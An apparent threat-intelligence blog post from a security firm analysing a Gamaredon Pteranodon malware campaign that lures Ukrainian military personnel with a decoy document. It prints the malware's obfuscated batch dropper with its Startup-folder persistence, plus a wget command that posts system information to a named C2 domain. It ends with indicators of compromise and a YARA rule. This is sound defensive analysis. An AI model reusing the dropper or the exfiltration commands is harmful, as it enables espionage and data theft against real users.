{
    "title": "the russian shadow in eastern europe_ ukrainian mod campaign. - yoroi",
    "text": "Privacy  - Terms\nThe Russian Shadow in Eastern Europe: Ukrainian MOD Campaign.\nIntroduction\nFew days after the publication of our technical article related to the evidence of possible APT28 interference in the Ukrainian elections, we\nspotted another signal of a sneakier on-going operation.\nThis campaign, instead, seems to be linked to another Russian hacking group: Gamaredon.  The Gamaredon APT was first spotted in 2013 and\nin 2015, when researchers at LookingGlass shared the details of a cyber espionage operation tracked as Operation Armageddon, targeting\nother Ukrainian entities. Their \"special attention” on Eastern European countries was also confirmed  by CERT-UA, the Ukrainian Computer\nEmergency Response Team.\nThe discovered attack appears to be designed to lure military personnel: it  leverage a legit document of the “State of the Armed Forces of\nUkraine” dated back in the 2nd April 2019. \nFigure 1:\nFake\ndocument\nshown\nafter\ninfection\nFor this reason, Cybaze-Yoroi ZLAB team dissected this suspicious sample to confirm the possible link with Russian threat actors.\nTechnical Analysis\nThe origin of the infection is an executable file pretending to be an RTF document.\nSha256 41a6e54e7ac2d488151d2b40055f3d7cacce7fb53e9d33c1e3effd4fce801410\nThreat Gamaredon Pteranodon stager (SFX file)\nSsdeep 12288:VpRN/nV+Nn3I4Wyawz2O7TE+sNEAMqdJnGB6q5c7pQbaOwWsAsK0iR7bkfeanZ8O:VpT/nV+N3I\nTable 1: Information about analyzed sample\nActually, the file is a Self Extracting Archive (SFX) claiming to be part of some Oracle software with an invalid signature. Its expiration date\nhas been set up the 16th of March 2019.\nFigure 2:\nFake\nOracle\ncertificate\nwith an\nexpiration\ndate set\non 16th of\nMarch\n2019\nA first glance inside the  SFX archive reveals four different files. One of them is batch file containing the actual infection routine.\nFigure 3:\nFiles\ncontained\nin SFX\narchive\n@echo offset xNBsBXS=%random%*JjuCBOSFor %%q In (wireshark procexp) do (TaskList /FI \"ImageName EQ %%q.exe\" | Find /I\n\"%%q.exe\")If %ErrorLevel% NEQ 1 goto exitIf SddlzCf==x86 Set WqeZfrx=x64if SddlzCf==qKLGBsL set SddlzCf=%random%*xNBsBXS-\nJjuCBOSset \"ldoGIUv=%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\"CEFNPKLIf SddlzCf==x86 Set WqeZfrx=x64set\n\"UlHjSKD=%USERPROFILE%\"set qKLGBsL=%SddlzCf%+%JjuCBOS%-xNBsBXSset fnQWAZC=winsetupset xNBsBXS=%random%*JjuCBOSset\nqKLGBsL=%SddlzCf%+%JjuCBOS%-xNBsBXSset \"paJvVjr=Document\"if SddlzCf==qKLGBsL set SddlzCf=%random%*xNBsBXS-JjuCBOSset\neBqwVLK=%fnQWAZC%.lnkCEFNPKLif SddlzCf==qKLGBsL set SddlzCf=%random%*xNBsBXS-JjuCBOSset YFCaOEf=28262set\nqKLGBsL=%SddlzCf%+%JjuCBOS%-xNBsBXSset vvozoFB=11326set lDwWuLo=26710If SddlzCf==x86 Set WqeZfrx=x64set\nprJqIBB=dcthfdyjdfcdst,tvset qKLGBsL=%SddlzCf%+%JjuCBOS%-xNBsBXSif SddlzCf==qKLGBsL set SddlzCf=%random%*xNBsBXS-\nJjuCBOStaskkill /f /im %fnQWAZC%.exeCEFNPKLRENAME \"%lDwWuLo%\" %lDwWuLo%.exeset\nxNBsBXS=%random%*JjuCBOS%lDwWuLo%.exe \"-p%prJqIBB%set qKLGBsL=%SddlzCf%+%JjuCBOS%-xNBsBXScopy /y \"%fnQWAZC%\"\n\"%UlHjSKD%\\%fnQWAZC%.exe\"if SddlzCf==qKLGBsL set SddlzCf=%random%*xNBsBXS-JjuCBOSif exist \"%UlHjSKD%\\%fnQWAZC%.exe\" call\n:GhlJKaGIf SddlzCf==x86 Set WqeZfrx=x64if not exist \"%UlHjSKD%\\%fnQWAZC%.exe\" call :PEEnqrLset\nxNBsBXS=%random%*JjuCBOSRENAME \"%YFCaOEf%\" %eBqwVLK%if SddlzCf==qKLGBsL set SddlzCf=%random%*xNBsBXS-JjuCBOScopy\n\"%eBqwVLK%\" \"%ldoGIUv%\" /yset qKLGBsL=%SddlzCf%+%JjuCBOS%-xNBsBXSRENAME \"%vvozoFB%\" \"%paJvVjr%.docx\"if SddlzCf==qKLGBsL\nset SddlzCf=%random%*xNBsBXS-JjuCBOS\"%CD%\\%paJvVjr%.docx\"set xNBsBXS=%random%*JjuCBOSexit /b\n:GhlJKaGif SddlzCf==qKLGBsL set SddlzCf=%random%*xNBsBXS-JjuCBOSstart \"\" \"%UlHjSKD%\\%fnQWAZC%.exe\"CEFNPKLexit /b\n:PEEnqrLset xNBsBXS=%random%*JjuCBOSRENAME \"%fnQWAZC%\" %fnQWAZC%.exe::6start \"\" \"%fnQWAZC%.exe\"If SddlzCf==x86 Set\nWqeZfrx=x64exit /b\nFirstly, this batch script looks for the presence of running Wireshark and Process Explorer programs through the tasklist.exe utility. Then it\nrenames the “11326” file in “Document.docx” and opens it. This is the decoy document seen in Figure 1. \nThe third step is to extract the contents of the password protected archive named “26710”. The scripts uses the hard-coded password\n“dcthfdyjdfcdst,tv ” to extract its content, placing them it on “%USERPROFILE%\\winsetup.exe” and creating a LNK symlink into the\n“%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\" directory to ensure its persistence.\nSha256 653a4205fa4bb7c58ef1513cac4172398fd5d65cab78bef7ced2d2e828a1e4b5\nThreat Gamaredon Pteranodon stager (SFX)\nSsdeep 12288:9pRN/nV+Nn4mNoks/EysKvqjigldJuFjBqg9DmTBs34I8:9pT/nV+N4QokKK7zg9qgQI8\nTable 2: Information about SFX stager\nThis additional file is a SFX file containing another script and a PE32 binary.\nFigure 4:\nFiles\ncontained\nin SFX\narchive\n“MicrosoftCreate.exe ” file is the UPX-packed version of the “wget” tool compiled for Window, a free utility for non-interactive HTTP\ndownloads and uploads, a flexible tool commonly used by sys-admins and sometimes abused by threat actors.\nThe actual malicious logic of the Pteranodon implant is contained within the “30347.cmd” script. Besides junk instructions and obfuscation,\nthe malware gather information about the compromised machine through the command “systeminfo.exe”. The results are stored into the file\n“fnQWAZC” and then sent to the command and control server “librework[.ddns[.net”, leveraging the wget utility previously found.\nFigure 5:\nThe C2 and\nobfuscations\ntechnique\nMicrosoftCreate.exe --user-agent=\"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0\" --post-\ndata=\"versiya=arm_02.04&comp=ADMIN-PC&id=ADMIN-PC_del&sysinfo=Nome host:                            ADMIN-PC+###.......”\nFigure 6:\nInformation\nabout\nvictim\nmachine\nsent to C2\nThe malware also schedules the execution of two other actions.\nFigure 7:\nPersistence\nthrough\ntask\nschedule\nThe first one tries to contact “bitwork[.ddns[.net” to download a “setup.exe” file and store it in the same folder. The other file, “ie_cash.exe”,\nis stored into the  “%APPDATA%\\Roaming\\Microsoft\\IE\\” folder. Despite the different name, it actually is another copy of the wget tool.\nFigure 8:\nPersistence\nthrough\ntask\nschedule\n(II)\nThe second scheduled activity is planned every 32 minutes and it is designed to run the files downloaded by the previous task. A typical trick\npart of the Gamaredon arsenal from long time: in fact, the recovered sample is part of the Pteranodon implant and matches its typical code\npatterns, showing no relevant edits with respect to previous variants.\nIn the end, investigating the “librework[.ddns[.net” domain we discovered several other samples connect to the same C2. All of them appeared\nin-the-wild during the first days of April, suggesting the command infrastructure might still be fully functional.\nFigure 9: other\nsamples linked to\n“librework[.ddns[.net”\nC2 (Source:VT)\nConclusion\nThe Pteranodon implant seems to be constantly maintained by the Gamaredon APT group since 2013, a tool the attackers found very effective\nsince they are still using it after such a long time. A part this technical consideration, is quite interesting to notice how strong seems to be the\nRussian interest towards the East-Europe, along with the other recent state-sponsored activities possibly aimed to interfere with the\nUkrainian politics (See “ APT28 and Upcoming Elections: evidence of possible interference ” and Part II ), confirming this cyber-threat is\noperating in several fronts.\nIndicators of Compromise\nC2:\nhxxp://librework[.ddns[.net\nhxxp://bitwork[.ddns[.net\nPersistence:\n%APPDATA%\\Roaming\\Microsoft\\IE\\ie_cash.exe\n\"C:\\Users\\admin\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\winsetup.lnk\"\nHash:\na48ad33695a44de887bba8f2f3174fd8fb01a46a19e3ec9078b0118647ccf599\nda4f9588a891662fc0a687fd584a0cc9acb5ec28b409614581d27cfdd56f4470\ne1e31702aad4bd7557a05906eb3004e9a72d77aa57e448379bee9a350cbba657\n956fbaafb5f59e8c7e67b04647d0973d57c5949aa47eec8e9e20c20709512074\nfc6cbf19331033ae758ca91fe6bab1539793b6153b10a0a7d61f60bdfc4bc791\nc5d6e014af6136132b0f7400e5c826c5185611ea540e977426bfa3bda4ac75e6\n5e16a71c7b99cb2780c31af34b268b78525b2b8fed55ff9e7bd4db8b1ba66f90\n41a6e54e7ac2d488151d2b40055f3d7cacce7fb53e9d33c1e3effd4fce801410\n54fd3a8b57afb73919275f6208e758256ac0054eccb1afb8184427d243a9f8b9\n61a611e3be93a6b0511ee11a26fedcb6a96ba1101f31afe5cf7b9abffeb5ab28\n18cd658fac1dd52a75b4eb6558d06dfe5be0e4db7078d72f663c44507449168c\n73450f87d92805582eb38023adba363c13f833389e0e9768d9232c598dc6e2cc\na49dc86dc9ae36313a36cbe2c7b712eebebe923971e29aeab564d8d1cef699bb\n603c92b4385a32c9fc0b88da600d2dc19e46174201fa016965ffda9fd957ed38\n18cd658fac1dd52a75b4eb6558d06dfe5be0e4db7078d72f663c44507449168c\nYara Rules\nrule GamaredonPteranodon_SFX {\nmeta:\n     description = \"Yara Rule for Pteranodon implant Family\"\n     author = \"ZLAB Yoroi - Cybaze\"\n     last_updated = \"2019-04-19\"\n     tlp = \"white\"\n     category = \"informational\"\n   strings:\n      $s1 = \"SFX module - Copyright (c) 2005-2012 Oleg Scherbakov\"\n      $s2 = \"7-Zip archiver - Copyright (c) 1999-2011 Igor Pavlov\" \n      $s3 = \"RunProgram=\\\"hidcon\" \n      $s4 = \"7-Zip - Copyright (c) 1999-2011 \" ascii\n      $s5 = \"sfxelevation\" ascii wide\n      $s6 = \"Error in command line:\" ascii wide\n      $s7 = \"%X - %03X - %03X - %03X - %03X\" ascii wide\n      $s8 = \"- Copyright (c) 2005-2012 \"  ascii\n      $s9 = \"Supported methods and filters, build options:\" wide ascii\n      $s10 = \"Could not overwrite file \\\"%s\\\".\" wide ascii\n      $s11 = \"7-Zip: Internal error, code 0x%08X.\" wide ascii\n      $s12 = \"@ (%d%s)\"  wide ascii\n      $s13 = \"SfxVarCmdLine0\" ascii\n      $s14 = \"11326\"\n      $s15 = \"29225\"\n      $s16 = \"6137\"\n      $cmd = \".cmd\" wide ascii \ncondition:\n      12 of ($s*) and $cmd\n}\nSeat\nYoroi S.r.l.\nVia Giovanni Battista Martini 6,\nRoma RM, 00198\nContact\ninfo@yoroi.company\n+39 051 0301005\nLegal\nTerms & Conditions\nPrivacy Policy\nWarning system\nSubscribe to our early warning\nsystem\nDownloads News\nSocial\nP.IVA. 03407741200 - R.E.A. RM 1559639 - Codice Fiscale 03407741200 - Capitale Sociale: Euro 50.000 IV\ncredits: SimpleNetworksDefence center\nSolutions  \nBlog\nHome\nDownloads\nAbout us\nContacts\n "
}